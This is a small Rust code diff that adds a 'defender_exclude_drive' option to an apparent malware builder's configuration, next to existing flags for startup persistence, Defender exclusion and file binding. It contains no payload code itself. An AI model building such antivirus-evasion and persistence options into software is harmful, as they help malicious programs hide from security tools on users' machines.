@@ -53,6 +53,7 @@ pub struct MfBuilder {
     single_instance: bool,
     run_on_startup: bool,
     defender_exclusion: bool,
+    defender_exclude_drive: bool,
     bind_file: bool,
     file_extension: SupportedFileExtension,
 
@@ -96,6 +97,7 @@ fn run_cli_mode() {
         single_instance: config["single_instance"].as_bool().unwrap(),
         run_on_startup: config["run_on_startup"].as_bool().unwrap(),
         defender_exclusion: config["defender_exclusion"].as_bool().unwrap(),
+        defender_exclude_drive: config["defender_exclude_drive"].as_bool().unwrap(),
         bind_file: config["binder"].as_bool().unwrap(),
         file_extension: SupportedFileExtension::from_str(config["file_extension"].as_str().unwrap()),
         
